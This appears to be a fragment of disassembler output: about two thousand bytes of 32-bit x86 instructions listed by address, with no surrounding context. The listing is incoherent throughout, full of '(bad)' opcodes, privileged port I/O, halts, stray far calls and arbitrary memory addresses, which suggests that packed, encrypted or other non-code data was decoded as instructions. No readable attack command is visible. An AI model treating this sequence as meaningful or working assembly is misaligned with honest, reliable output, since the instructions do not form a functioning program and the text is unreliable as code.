  402802:	or     dh,BYTE PTR [eax-0x354fec27]
  402808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402809:	lock add BYTE PTR [edi-0x3700cf7b],bh
  402810:	push   edx
  402811:	or     al,0xe4
  402813:	pop    ebp
  402814:	pop    esp
  402815:	xchg   ecx,eax
  402816:	xor    BYTE PTR [edx],cl
  402818:	addr16 (bad) 
  40281a:	mov    bl,0x61
  40281c:	sbb    al,0xe0
  40281e:	xor    BYTE PTR [edx+0xf],al
  402821:	inc    eax
  402822:	aas    
  402823:	lahf   
  402824:	mov    ds,WORD PTR [ecx]
  402826:	out    dx,eax
  402827:	je     0x40289a
  402829:	sub    ch,dl
  40282b:	xor    eax,0x3037ce08
  402830:	push   edx
  402831:	(bad)  
  402832:	and    eax,0x3bcc5c
  402837:	push   ebx
  402838:	jne    0x402853
  40283a:	or     eax,0x1843c82e
  40283f:	cmp    dl,0xfa
  402842:	fcomp  QWORD PTR [ecx]
  402844:	or     eax,0xfc56821a
  402849:	out    dx,al
  40284a:	or     eax,ebx
  40284c:	imul   edi,ecx,0x247d21d7
  402852:	pushf  
  402853:	mov    ecx,DWORD PTR ds:0xd02bcb41
  402859:	stos   BYTE PTR es:[edi],al
  40285a:	fbld   TBYTE PTR [edi]
  40285c:	or     al,0xb8
  40285e:	fstp   DWORD PTR [edx+0x122d1451]
  402864:	scas   al,BYTE PTR es:[edi]
  402865:	pop    eax
  402866:	(bad)  
  402868:	xor    edi,edi
  40286a:	(bad)  
  40286d:	or     al,BYTE PTR [esi+0x520aa185]
  402873:	outs   dx,BYTE PTR ds:[esi]
  402874:	in     al,0x88
  402876:	aaa    
  402877:	out    0xa2,al
  402879:	out    dx,eax
  40287a:	je     0x402805
  40287c:	push   0x5a34a308
  402881:	pop    ds
  402882:	mov    eax,ds:0xbb035c0a
  402887:	scas   al,BYTE PTR es:[edi]
  402888:	rcr    DWORD PTR [eiz*1+0xc3c839],0x2b
  402890:	sar    BYTE PTR [esi-0x7f],1
  402893:	pop    ss
  402894:	jns    0x40289f
  402896:	cmp    ecx,0xffffff81
  402899:	or     BYTE PTR [ecx],bh
  40289b:	add    DWORD PTR [ebp-0xb],esi
  40289e:	adc    BYTE PTR [ebx-0x64],al
  4028a1:	or     al,0x4a
  4028a3:	es lahf 
  4028a5:	mov    esi,0x94578630
  4028aa:	loop   0x40291a
  4028ac:	inc    esi
  4028ad:	or     BYTE PTR [ecx],dh
  4028af:	push   esp
  4028b0:	mov    ebx,DWORD PTR [esi-0x1c]
  4028b3:	fisub  DWORD PTR ds:0xa903f218
  4028b9:	lds    edi,FWORD PTR [eax]
  4028bb:	jmp    0x402875
  4028bd:	bound  eax,QWORD PTR [edi]
  4028bf:	out    dx,al
  4028c0:	sbb    ecx,DWORD PTR [ebx-0x77]
  4028c3:	sbb    edi,DWORD PTR [edx+0x44]
  4028c6:	fadd   DWORD PTR [ebp+ebp*4+0x41]
  4028ca:	adc    DWORD PTR [edi],0x1a7d5453
  4028d0:	adc    BYTE PTR [ecx-0x1a803e79],al
  4028d6:	jb     0x4028c3
  4028d8:	adc    al,0x43
  4028da:	lock inc bp
  4028dd:	ss das 
  4028df:	sub    BYTE PTR [esp+eax*1-0x64],ch
  4028e3:	jno    0x40286e
  4028e5:	xchg   ebx,eax
  4028e6:	xchg   ecx,eax
  4028e7:	retf   
  4028e8:	outs   dx,DWORD PTR ds:[esi]
  4028e9:	mov    edi,0xdf1d3047
  4028ee:	vmwrite ebx,DWORD PTR [ecx+0x70]
  4028f2:	xor    eax,0x7ef33b39
  4028f7:	sbb    ch,BYTE PTR [esp+eax*1+0x40]
  4028fb:	fnstcw WORD PTR ds:[ebx-0x76bc9428]
  402902:	pop    edi
  402903:	or     al,0x6f
  402905:	cmp    esi,ebx
  402907:	jg     0x4028ef
  402909:	imul   edx,DWORD PTR [ecx],0x4f
  40290c:	daa    
  40290d:	mov    DWORD PTR ds:0x9e8880a,0x669b118d
  402917:	sbb    BYTE PTR [eax+0x3c7838a3],dl
  40291d:	mov    ecx,0xd8036f4b
  402922:	adc    eax,0xa3758740
  402927:	sub    al,0x1d
  402929:	in     al,0x3a
  40292b:	out    0xfe,al
  40292d:	inc    ebx
  40292e:	and    al,0xc6
  402930:	add    eax,0xdc0b0a34
  402935:	ret    
  402936:	pop    ss
  402937:	outs   dx,DWORD PTR ds:[esi]
  402938:	sbb    eax,0x8b5dbfc4
  40293d:	cmp    al,0x18
  40293f:	lea    esi,[eax+ebx*1+0x4]
  402943:	cmc    
  402944:	push   ss
  402945:	mov    WORD PTR [eax],ds
  402947:	add    edx,ebx
  402949:	or     al,0xfe
  40294b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40294c:	adc    ecx,DWORD PTR [ebp+0x22]
  40294f:	(bad)  
  402950:	or     BYTE PTR [edi+0x75],cl
  402953:	jmp    0x4029b3
  402955:	pop    edi
  402956:	fbld   TBYTE PTR [ebp+0x2758070a]
  40295c:	add    ecx,DWORD PTR [ebp-0x7a]
  40295f:	mov    ebx,0x261ab659
  402965:	or     al,0xec
  402967:	gs push 0xba1f4044
  40296d:	inc    esp
  40296e:	mov    cl,0x57
  402970:	sbb    eax,0xbfc36800
  402975:	ins    BYTE PTR es:[edi],dx
  402976:	pop    edi
  402977:	sbb    bh,0x17
  40297a:	cdq    
  40297b:	idiv   edi
  40297d:	add    dl,0x30
  402980:	vunpcklps xmm0,xmm6,XMMWORD PTR [esi]
  402985:	adc    edi,DWORD PTR [ebx-0x63e4af41]
  40298b:	sti    
  40298c:	pop    eax
  40298d:	dec    ecx
  40298e:	clc    
  40298f:	(bad)  [ecx+0x7704a11c]
  402995:	rcr    DWORD PTR [ebp+0x7d],0x2b
  402999:	rcl    al,1
  40299b:	mov    dl,BYTE PTR [edx-0x75247178]
  4029a1:	fld    DWORD PTR [ebp+0x13]
  4029a4:	pop    ebp
  4029a5:	ins    DWORD PTR es:[edi],dx
  4029a6:	sub    DWORD PTR [esi],ebx
  4029a8:	iret   
  4029a9:	dec    ecx
  4029aa:	sbb    ah,dh
  4029ac:	or     edi,edi
  4029ae:	fstp   QWORD PTR [eax+0x58715b7]
  4029b4:	push   ebx
  4029b5:	neg    eax
  4029b7:	sbb    eax,eax
  4029b9:	inc    eax
  4029ba:	pop    ebx
  4029bb:	sub    edi,DWORD PTR [esi+0x185feb7d]
  4029c1:	lahf   
  4029c2:	adc    al,0xff
  4029c4:	ja     0x4029e2
  4029c6:	add    ah,BYTE PTR [eax]
  4029c8:	mov    esi,DWORD PTR [edi]
  4029ca:	mov    ecx,0xd271b0d6
  4029cf:	mov    dh,0xf3
  4029d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d2:	sub    al,0xc9
  4029d4:	jg     0x402a27
  4029d6:	iret   
  4029d7:	inc    esp
  4029d8:	xchg   esp,eax
  4029d9:	loopne 0x4029ed
  4029db:	dec    edi
  4029dc:	ins    BYTE PTR es:[edi],dx
  4029dd:	push   edi
  4029de:	cmp    BYTE PTR ds:0x80b83c18,bh
  4029e4:	sti    
  4029e5:	push   es
  4029e6:	lock adc al,0x83
  4029e9:	cmp    eax,0xb6a0920
  4029ee:	mov    eax,0x261b70d1
  4029f3:	dec    esi
  4029f4:	ret    0x530
  4029f7:	shl    DWORD PTR [ecx],1
  4029f9:	ds jle 0x40298b
  4029fc:	lock push 0x1e
  4029ff:	push   0xf9f56aba
  402a04:	jl     0x402a05
  402a06:	adc    DWORD PTR [eax+0x1a9cb0fc],0x2
  402a0d:	push   0x7283af0
  402a12:	lea    esi,[eax+0x5b]
  402a15:	pop    edi
  402a16:	sub    al,0x2f
  402a18:	fsub   QWORD PTR [ebx]
  402a1a:	pop    edx
  402a1b:	stc    
  402a1c:	into   
  402a1d:	pop    esp
  402a1e:	pusha  
  402a1f:	or     DWORD PTR [esi],edi
  402a21:	add    BYTE PTR ds:0x5cbf5cb4,bl
  402a27:	push   ebx
  402a28:	loopne 0x402a2a
  402a2a:	mov    WORD PTR ds:0xbb51eced,cs
  402a30:	sbb    esi,0xbeb37eee
  402a36:	inc    eax
  402a37:	xchg   ebx,eax
  402a38:	cmp    BYTE PTR [ebx+0x28],0x36
  402a3c:	push   ss
  402a3d:	cmp    DWORD PTR [esi],0xffffffa2
  402a40:	lea    ecx,ds:0x3f06a235
  402a46:	and    BYTE PTR [esi],al
  402a48:	(bad)  
  402a49:	cld    
  402a4a:	jae    0x4029d3
  402a4c:	(bad)  
  402a4d:	push   eax
  402a4e:	call   0xf747:0x190ca1ef
  402a55:	or     al,0x1b
  402a57:	mov    ds:0x642a5929,al
  402a5c:	enter  0x3513,0xec
  402a60:	mov    al,bl
  402a62:	jbe    0x402a66
  402a64:	jne    0x402a74
  402a66:	pop    ds
  402a67:	add    BYTE PTR [ebp+0x79],dh
  402a6a:	inc    ebx
  402a6b:	or     al,0x41
  402a6d:	dec    esp
  402a6e:	out    dx,al
  402a6f:	bound  edx,QWORD PTR [edx]
  402a71:	sbb    BYTE PTR [ecx],al
  402a73:	jbe    0x402a7e
  402a75:	jp     0x402a77
  402a77:	mov    edx,0x107b51d8
  402a7c:	sbb    BYTE PTR [edx+eiz*1],0x3e
  402a80:	lds    ebx,FWORD PTR [ebx+0x14]
  402a83:	push   ss
  402a84:	xor    eax,0x3be68b6b
  402a89:	jne    0x402a8f
  402a8b:	lahf   
  402a8c:	out    dx,eax
  402a8d:	sti    
  402a8e:	test   al,0x88
  402a90:	adc    edx,DWORD PTR [esi-0x62]
  402a93:	int3   
  402a94:	ss inc esp
  402a96:	jne    0x402a9b
  402a98:	mov    esi,0xf504af16
  402a9d:	mov    cs,WORD PTR [edx+ebp*2+0x34]
  402aa1:	inc    ecx
  402aa2:	stos   DWORD PTR es:[edi],eax
  402aa3:	pusha  
  402aa4:	sub    BYTE PTR [edi-0x9cef731],bl
  402aaa:	mov    esi,0xa108a560
  402aaf:	push   edi
  402ab0:	hlt    
  402ab1:	lods   al,BYTE PTR ds:[esi]
  402ab2:	add    eax,0xfb682b61
  402ab7:	cmp    bl,bh
  402ab9:	imul   ebp,edi,0xab3c458d
  402abf:	xor    eax,0x4022a33e
  402ac4:	jnp    0x402b00
  402ac6:	bound  edx,QWORD PTR [edi]
  402ac8:	xchg   DWORD PTR [edi-0x74166cfb],ecx
  402ace:	mov    DWORD PTR [edi],ebp
  402ad0:	lock and BYTE PTR [ebp-0x2e],0xc7
  402ad5:	pop    es
  402ad6:	cli    
  402ad7:	clc    
  402ad8:	dec    ecx
  402ad9:	jl     0x402b50
  402adb:	add    DWORD PTR [edx],0xffffffed
  402ade:	adc    al,dh
  402ae0:	inc    DWORD PTR [esi]
  402ae2:	(bad)  [edx+eax*2+0x2a3142f8]
  402ae9:	and    ecx,DWORD PTR [ebx]
  402aeb:	pop    eax
  402aec:	(bad)  
  402aed:	push   ebp
  402aee:	ss xor cl,cl
  402af1:	fst    QWORD PTR [ebx]
  402af3:	sub    DWORD PTR [edx],ebx
  402af5:	mov    DWORD PTR [ebx],0xe428080e
  402afb:	mov    bh,BYTE PTR [ebx]
  402afd:	sbb    dl,ch
  402aff:	dec    esi
  402b00:	jne    0x402adc
  402b02:	pop    edi
  402b03:	mov    edi,0x277bb8ba
  402b08:	and    DWORD PTR [ecx+0x7f],eax
  402b0b:	sbb    al,BYTE PTR [edx+eax*2+0x70ac2c98]
  402b12:	mov    bl,bl
  402b14:	adc    cl,BYTE PTR [edi]
  402b16:	pop    eax
  402b17:	or     ecx,DWORD PTR [eax-0x4]
  402b1a:	hlt    
  402b1b:	pusha  
  402b1c:	fbstp  TBYTE PTR [esi-0x7f141093]
  402b22:	push   DWORD PTR [esi]
  402b24:	xchg   DWORD PTR [ebx+0x14],edi
  402b27:	dec    ebx
  402b28:	mov    ds:0x431b19ec,eax
  402b2d:	or     bh,BYTE PTR [esi+0x29]
  402b30:	jmp    0x7ec0:0x7317fa37
  402b37:	and    al,0x50
  402b39:	push   ss
  402b3a:	or     al,BYTE PTR [ebx+0x6f50fee0]
  402b40:	sub    eax,0x5add47e2
  402b45:	mov    WORD PTR [edx+eax*1+0x61],0x813
  402b4c:	pop    edx
  402b4d:	mov    eax,esp
  402b4f:	mov    al,cl
  402b51:	(bad)  
  402b52:	push   eax
  402b53:	cld    
  402b54:	call   0xef67:0xc3b53af8
  402b5b:	pop    esi
  402b5c:	test   esp,0xf889cf89
  402b62:	xchg   edi,eax
  402b63:	stc    
  402b64:	mov    edi,eax
  402b66:	jne    0x402b59
  402b68:	xchg   DWORD PTR [ecx-0x7660f6a5],esi
  402b6e:	lock pushf 
  402b70:	mov    ecx,edx
  402b72:	sub    ebp,eax
  402b74:	mov    DWORD PTR [ebx],edi
  402b76:	mov    dh,0x3e
  402b78:	in     al,0x9a
  402b7a:	shr    DWORD PTR [ebx],cl
  402b7c:	xor    edx,DWORD PTR [edx+0x50]
  402b7f:	add    ecx,DWORD PTR [eax]
  402b81:	addr16 add al,0x6f
  402b84:	and    eax,0xb8a108ef
  402b89:	add    eax,0x66005c0c
  402b8e:	add    BYTE PTR [ebx],0xa2
  402b91:	cmp    ebx,DWORD PTR [ebx]
  402b93:	ins    DWORD PTR es:[edi],dx
  402b94:	fisttp QWORD PTR [edi-0x7eaccb38]
  402b9a:	(bad)  
  402b9b:	sar    bh,0x9d
  402b9e:	(bad)
  402ba2:	ins    BYTE PTR es:[edi],dx
  402ba3:	inc    ecx
  402ba4:	icebp  
  402ba5:	imul   edi,eax,0x6c
  402ba8:	jg     0x402bb3
  402baa:	clc    
  402bab:	repz push ss
  402bad:	(bad)  
  402bae:	frstor [ebx-0x15]
  402bb1:	pop    edi
  402bb2:	lea    ebp,[esi+0x1]
  402bb5:	cmp    ebp,0x7d1507ff
  402bbb:	sub    BYTE PTR [esi+0x76],dl
  402bbe:	push   cs
  402bbf:	loop   0x402b42
  402bc1:	imul   edi,DWORD PTR [edx+0x82d1fa2],0xffffffde
  402bc8:	pextrw ecx,(bad),0xc5
  402bca:	(bad)  
  402bcb:	iret   
  402bcc:	jl     0x402bdd
  402bce:	gs (bad) 
  402bd0:	mov    ecx,ebx
  402bd2:	scas   al,BYTE PTR es:[edi]
  402bd3:	dec    ebp
  402bd4:	test   DWORD PTR [esi],0xddf7330d
  402bda:	add    ebx,ebx
  402bdc:	push   cs
  402bdd:	shl    DWORD PTR [ecx],cl
  402bdf:	mov    edi,DWORD PTR ds:[ebp+0x7ed0ca5]
  402be6:	xor    cl,BYTE PTR ds:0x33027d2f
  402bec:	or     BYTE PTR [ebp+0x7c1ecb72],ah
  402bf2:	adc    bh,bh
  402bf4:	inc    esi
  402bf5:	in     al,dx
  402bf6:	mov    al,0xd5
  402bf8:	push   edx
  402bf9:	nop
  402bfa:	mov    ecx,0xe3fb4504
  402bff:	test   esi,ebx
  402c01:	lock nop
  402c03:	xor    ecx,ecx
  402c05:	push   ecx
  402c06:	and    DWORD PTR [edx+0x3a],edx
  402c09:	or     bh,cl
  402c0b:	cmp    cl,BYTE PTR [edx+0x1]
  402c0e:	retf   
  402c0f:	outs   dx,DWORD PTR ds:[esi]
  402c10:	sbb    ecx,ebx
  402c12:	pop    ebx
  402c13:	add    al,0x2
  402c15:	je     0x402c22
  402c17:	add    esp,DWORD PTR [ebp-0x7d]
  402c1a:	mov    edx,0xc742e8eb
  402c1f:	push   cs
  402c20:	out    dx,eax
  402c21:	outs   dx,DWORD PTR ds:[esi]
  402c22:	add    BYTE PTR [ecx-0x2ed6a52f],cl
  402c28:	jmp    0x2d6f8f5b
  402c2d:	push   edx
  402c2e:	out    0xae,al
  402c30:	imul   ebx,ebx,0x66
  402c33:	cmp    esi,DWORD PTR [eax]
  402c35:	and    BYTE PTR [esp+ebp*1],al
  402c38:	pop    ss
  402c39:	add    eax,0x8b0e7404
  402c3e:	int    0xb6
  402c40:	mov    edi,0xeb083306
  402c45:	in     al,0x4
  402c47:	add    al,BYTE PTR [edx]
  402c49:	cmp    DWORD PTR [edx],edi
  402c4b:	lock in al,dx
  402c4d:	xchg   ebx,eax
  402c4e:	pop    ebp
  402c4f:	cmp    ebp,DWORD PTR ds:0x420a8a44
  402c55:	dec    ecx
  402c56:	nop
  402c57:	push   edi
  402c58:	aam    0x42
  402c5a:	pop    esp
  402c5b:	mov    eax,0x88d78928
  402c60:	repnz scas al,BYTE PTR es:[edi]
  402c62:	mov    esp,0x9b185bd1
  402c67:	mov    ebp,0x5f58c16d
  402c6c:	sbb    BYTE PTR [edi+0x5],bl
  402c6f:	loope  0x402c6d
  402c71:	aaa    
  402c72:	mov    edx,0x382c1e37
  402c77:	int    0x40
  402c79:	cld    
  402c7a:	ret    
  402c7b:	sbb    DWORD PTR [edi],edi
  402c7d:	inc    edx
  402c7e:	mov    ecx,0xa3978181
  402c83:	mov    ds:0xd0adc1fd,al
  402c88:	pop    ss
  402c89:	push   cs
  402c8a:	mov    edi,DWORD PTR [ecx+0x51]
  402c8d:	push   esi
  402c8e:	cld    
  402c8f:	add    edx,edi
  402c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c92:	mov    ah,BYTE PTR [ecx-0x139de893]
  402c98:	mov    edi,0x13124e8b
  402c9d:	adc    esi,eax
  402c9f:	(bad)  
  402ca0:	push   ebp
  402ca1:	mov    esp,0x1c16f317
  402ca6:	stc    
  402ca7:	iret   
  402ca8:	cs mov cl,0xf9
  402cab:	mov    esi,0x60416143
  402cb0:	cmp    edx,DWORD PTR [eax]
  402cb2:	fidivr DWORD PTR [ebx]
  402cb4:	or     ch,ch
  402cb6:	retf   0xd68e
  402cb9:	mov    ebx,0x3c2c8e8a
  402cbe:	jno    0x402cee
  402cc0:	mov    WORD PTR [eax],ds
  402cc2:	add    eax,0xd357fc2e
  402cc7:	mov    esi,ecx
  402cc9:	int3   
  402cca:	inc    ebx
  402ccb:	cld    
  402ccc:	xor    al,0xb4
  402cce:	iret   
  402ccf:	pop    eax
  402cd0:	retf   0xc731
  402cd3:	push   ss
  402cd4:	pop    ebx
  402cd5:	dec    ebx
  402cd6:	mov    dh,0x89
  402cd8:	cli    
  402cd9:	xor    dh,BYTE PTR [ebp+0x36263b3]
  402cdf:	push   ebx
  402ce0:	push   cs
  402ce1:	pop    eax
  402ce2:	pinsrw mm6,edx,0xfb
  402ce6:	mov    ebx,DWORD PTR [ebp-0x63]
  402ce9:	dec    edi
  402cea:	clc    
  402ceb:	inc    ebp
  402cec:	jo     0x402c77
  402cee:	retf   0x50e9
  402cf1:	mov    edx,ecx
  402cf3:	ret    0x71ad
  402cf6:	and    BYTE PTR [ebx+0x1b],ch
  402cf9:	push   ebx
  402cfa:	xor    edi,edi
  402cfc:	mov    ds:0xe26d5c35,eax
  402d01:	xchg   esp,eax
  402d02:	adc    al,0x4c
  402d04:	or     al,0x39
  402d06:	(bad)  
  402d07:	jns    0x402cb9
  402d09:	inc    edx
  402d0a:	mov    DWORD PTR [ebx],ecx
  402d0c:	cmp    ah,0x4a
  402d0f:	out    dx,eax
  402d10:	add    edx,DWORD PTR ds:0x76e15b02
  402d16:	or     DWORD PTR [ebx],eax
  402d18:	(bad)  
  402d1a:	iret   
  402d1b:	push   cs
  402d1c:	es dec edx
  402d1e:	mov    ds:0xbad44db3,al
  402d23:	push   ecx
  402d24:	pop    ss
  402d25:	jae    0x402ce3
  402d27:	ja     0x402d25
  402d29:	mov    esi,0xa17f6301
  402d2e:	cmp    al,0xcc
  402d30:	aaa    
  402d31:	add    esi,DWORD PTR [edi]
  402d33:	dec    ebx
  402d34:	jmp    0x402d3e
  402d36:	xchg   ecx,eax
  402d37:	push   eax
  402d38:	mov    cl,0x4d
  402d3a:	or     eax,0x9c4417bf
  402d3f:	sbb    BYTE PTR [ecx+0x4f0a1bf2],cl
  402d45:	add    esi,ecx
  402d47:	mov    ecx,ebp
  402d49:	ins    DWORD PTR es:[edi],dx
  402d4a:	adc    al,0xed
  402d4c:	dec    ebx
  402d4d:	jne    0x402d38
  402d4f:	(bad)
  402d52:	out    0x91,al
  402d54:	into   
  402d55:	icebp  
  402d56:	mov    ebx,0x925a4a93
  402d5b:	pop    eax
  402d5c:	lea    esp,[esp+edx*4]
  402d5f:	jmp    eax
  402d61:	(bad)  
  402d62:	das    
  402d63:	xor    al,cl
  402d65:	adc    ch,BYTE PTR [ebp+0x3fc7f102]
  402d6b:	and    DWORD PTR [esi+0x4d79f854],edx
  402d71:	cmp    BYTE PTR [edx+esi*1+0x53],dh
  402d75:	dec    ebx
  402d76:	mov    ds:0x1b4876a4,al
  402d7b:	sub    edx,DWORD PTR [ebx]
  402d7d:	push   eax
  402d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7f:	pop    eax
  402d80:	or     BYTE PTR [esi-0x3b],ch
  402d83:	or     edx,DWORD PTR [ebx+0x5f4048e7]
  402d89:	pop    ebx
  402d8a:	mov    eax,edx
  402d8c:	add    esi,ebx
  402d8e:	cdq    
  402d8f:	daa    
  402d90:	push   edi
  402d91:	das    
  402d92:	fcomp  QWORD PTR [eax+0x2d]
  402d95:	mov    ebx,DWORD PTR [eax-0x4]
  402d98:	jns    0x402d6a
  402d9a:	sbb    esi,esp
  402d9c:	jg     0x402dc4
  402d9e:	dec    edx
  402d9f:	jl     0x402dbc
  402da1:	cmp    edx,ebx
  402da3:	jge    0x402dc4
  402da5:	sub    ebx,edx
  402da7:	inc    edi
  402da8:	sbb    DWORD PTR [ecx],edi
  402daa:	fldcw  WORD PTR [edi+0x11]
  402dad:	cmp    esi,DWORD PTR [ebp-0x47fbfee2]
  402db3:	in     al,dx
  402db4:	adc    DWORD PTR [ecx],esi
  402db6:	rol    BYTE PTR [ecx+0x1d],cl
  402db9:	mov    bl,0xe5
  402dbb:	jmp    0x402da2
  402dbd:	mov    ebx,ebp
  402dbf:	adc    bh,dh
  402dc1:	pop    ebx
  402dc2:	mov    eax,ds:0x4acea749
  402dc7:	ds push esi
  402dc9:	daa    
  402dca:	xchg   esp,eax
  402dcb:	jmp    0xc152:0x6f42f0de
  402dd2:	add    al,0xfc
  402dd4:	dec    edi
  402dd5:	jge    0x402de7
  402dd7:	cmp    edi,edx
  402dd9:	jle    0x402ddd
  402ddb:	inc    edi
  402ddc:	mov    eax,0x6bca0970
  402de1:	cld    
  402de2:	js     0x402de5
  402de4:	jmp    0xc0bd:0xc339580e
  402deb:	test   eax,ebx
  402ded:	sub    DWORD PTR [ebx+0x148d931e],ecx
  402df3:	das    
  402df4:	test   al,0x66
  402df6:	adc    dh,BYTE PTR [eax+0x7a]
  402df9:	pop    ebx
  402dfa:	bound  eax,QWORD PTR [ecx]
  402dfc:	cdq    
  402dfd:	mov    bh,0x6c
  402dff:	pop    ebp
  402e00:	sub    al,0xa
  402e02:	ret    0xfde9
  402e05:	out    0x5b,eax
  402e07:	inc    eax
  402e08:	mov    ?,WORD PTR [ebx+0x314e7457]
  402e0e:	jmp    0x402e57
  402e10:	dec    edi
  402e11:	cld    
  402e12:	push   edi
  402e13:	xor    ch,al
  402e15:	out    dx,al
  402e16:	mov    eax,0x1b784afd
  402e1b:	mov    al,BYTE PTR [esi]
  402e1d:	inc    esi
  402e1e:	cmp    DWORD PTR [esi+0x14],edi
  402e21:	test   BYTE PTR [eax],dl
  402e23:	mov    ebx,ecx
  402e25:	sbb    al,0xd1
  402e27:	sub    ah,ch
  402e29:	or     ch,BYTE PTR [esi-0x136261d3]
  402e2f:	pop    edx
  402e30:	xchg   edi,eax
  402e31:	add    DWORD PTR [edx-0x35],edi
  402e34:	push   ebp
  402e35:	push   0x28
  402e37:	aaa    
  402e38:	clc    
  402e39:	sub    eax,edx
  402e3b:	ja     0x402ded
  402e3d:	inc    esp
  402e3e:	in     eax,dx
  402e3f:	and    eax,0x482a8f9e
  402e44:	sub    al,0x74
  402e46:	jmp    0x402df6
  402e48:	and    edx,DWORD PTR [esi+0x23]
  402e4b:	cmp    DWORD PTR [eax+0x52],0x75
  402e4f:	sbb    eax,0x3eba08e6
  402e54:	sub    al,0x6c
  402e56:	out    dx,al
  402e57:	or     DWORD PTR [ebx+0x58f81be0],edx
  402e5d:	outs   dx,BYTE PTR ds:[esi]
  402e5e:	mov    DWORD PTR [ebx+0x4117a1b0],esp
  402e64:	jo     0x402e62
  402e66:	(bad)  
  402e67:	mov    dl,0xeb
  402e69:	sub    BYTE PTR [edi],ah
  402e6b:	inc    ebx
  402e6c:	in     eax,dx
  402e6d:	outs   dx,BYTE PTR ds:[esi]
  402e6e:	mov    eax,DWORD PTR ds:0xaffa6831
  402e74:	cmp    ecx,esi
  402e76:	jl     0x402e48
  402e78:	popf   
  402e79:	inc    ebp
  402e7a:	add    ebp,DWORD PTR [ecx+esi*8+0x3ec34667]
  402e81:	xor    al,0x12
  402e83:	icebp  
  402e84:	sub    dl,BYTE PTR [eax+0x32]
  402e87:	fs xchg ebp,eax
  402e89:	in     al,0xff
  402e8b:	neg    DWORD PTR ds:0x1835781
  402e91:	push   es
  402e92:	push   edx
  402e93:	pop    ss
  402e94:	je     0x402ea5
  402e96:	cmp    edi,DWORD PTR [ebx]
  402e98:	sbb    DWORD PTR [ecx+0x16500eb7],eax
  402e9e:	pop    eax
  402e9f:	stos   DWORD PTR es:[edi],eax
  402ea0:	cmp    eax,DWORD PTR [ecx+0x72aa37b1]
  402ea6:	or     al,0xab
  402ea8:	push   eax
  402ea9:	sbb    al,0x87
  402eab:	and    dx,WORD PTR [eax]
  402eae:	popf   
  402eaf:	call   0xd9e42883
  402eb4:	and    bh,BYTE PTR [ecx+0xa6d57bc]
  402eba:	mov    cl,0x51
  402ebc:	test   al,0x22
  402ebe:	jmp    0x402efc
  402ec0:	pop    edi
  402ec1:	jb     0x402f2f
  402ec3:	jno    0x402e80
  402ec5:	jae    0x402f39
  402ec7:	cmp    esp,0x5deba031
  402ecd:	pop    es
  402ece:	sub    BYTE PTR [eax-0x6b],ah
  402ed1:	pop    ds
  402ed2:	enter  0x327e,0x8c
  402ed6:	jmp    0x402f02
  402ed8:	mov    ecx,0xe4264872
  402edd:	xor    edx,DWORD PTR [eax+ebp*1+0x33]
  402ee1:	push   esp
  402ee2:	mov    ah,0x66
  402ee4:	sti    
  402ee5:	pop    eax
  402ee6:	mov    ebx,0x500c94c9
  402eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eec:	shr    al,1
  402eee:	in     eax,0x24
  402ef0:	pop    ss
  402ef1:	int3   
  402ef2:	(bad)  
  402ef3:	pop    edx
  402ef4:	push   DWORD PTR [edx]
  402ef6:	dec    ebp
  402ef7:	aad    0x16
  402ef9:	fs popf 
  402efb:	adc    DWORD PTR [eax-0x70a6b61],edx
  402f01:	or     al,0x93
  402f03:	fild   DWORD PTR [ebx]
  402f05:	or     eax,0x3370011
  402f0a:	call   0xffe8:0x4089d2c0
  402f11:	mov    dl,0x0
  402f13:	mov    esp,0x90f9a2a7
  402f18:	mov    bh,0xba
  402f1b:	mul    BYTE PTR [esi]
  402f1d:	mov    edx,0xde7d0133
  402f22:	pop    es
  402f23:	dec    ebx
  402f24:	cmp    eax,ebx
  402f26:	mov    ah,0xba
  402f28:	jmp    DWORD PTR [edx-0x19]
  402f2b:	fsubrp st(1),st
  402f2d:	push   cs
  402f2e:	xor    eax,0xf83bc32b
  402f33:	cmpps  xmm0,XMMWORD PTR [ebx],0xd2
  402f37:	subps  xmm5,xmm4
  402f3a:	add    eax,0x91084d01
  402f3f:	test   bl,0xd
  402f42:	ret    
  402f43:	mov    ds:0x519b08de,eax
  402f48:	inc    esi
  402f49:	nop
  402f4a:	sbb    eax,0x6b1a8eb1
  402f4f:	sub    DWORD PTR [ebx+0x69e78a1],ecx
  402f55:	pop    ecx
  402f56:	aaa    
  402f57:	or     BYTE PTR [edi+0x7],dh
  402f5a:	enter  0x3b14,0xd8
  402f5e:	inc    ebx
  402f5f:	and    BYTE PTR [ebx],al
  402f61:	leave  
  402f62:	jl     0x402f52
  402f64:	test   eax,0x17148bde
  402f69:	and    eax,0x902b0bc6
  402f6e:	mov    ds:0xc911cec0,eax
  402f73:	jmp    0x402fc8
  402f75:	mov    dh,BYTE PTR [ebx-0x4a42f26c]
  402f7b:	shr    cl,1
  402f7d:	adc    DWORD PTR ds:0xea06117c,eax
  402f83:	inc    esi
  402f84:	xchg   DWORD PTR [eax-0x57],eax
  402f87:	inc    esp
  402f88:	sbb    DWORD PTR [esi],edi
  402f8a:	jecxz  0x402fbf
  402f8c:	add    al,0xa3
  402f8e:	icebp  
  402f8f:	mov    ds:0xe77f19e8,eax
  402f94:	gs ret 
  402f96:	mov    edi,0x7b5b2316
  402f9b:	or     al,0x7
  402f9d:	xor    DWORD PTR [eax],ecx
  402f9f:	ret    
  402fa0:	mov    al,0x42
  402fa2:	push   eax
  402fa3:	sub    al,dh
  402fa5:	adc    al,ch
  402fa7:	outs   dx,DWORD PTR ds:[esi]
  402fa8:	mov    DWORD PTR [edi],ecx
  402faa:	sub    ah,BYTE PTR ds:0x26e0c789
  402fb0:	sbb    DWORD PTR [eax+0x5f0bffc0],ebp
  402fb6:	pop    ds
  402fb7:	mov    dl,BYTE PTR [esi+0x1]
  402fba:	cmp    al,0x49
  402fbc:	and    eax,0x3e740b3c
  402fc1:	cmp    al,0xc
  402fc3:	je     0x403016
  402fc5:	cmp    al,0xd
  402fc7:	mov    ch,0x6d
  402fc9:	mov    dh,0xbf
  402fcb:	xor    DWORD PTR [esi+ecx*1],edi
  402fce:	je     0x403046
  402fd0:	cmp    al,0xf
  402fd2:	sub    al,0x84
  402fd4:	cmp    al,0x11
  402fd6:	pop    es
  402fd7:	mov    ebx,DWORD PTR [eax]
  402fd9:	mov    bh,0xed
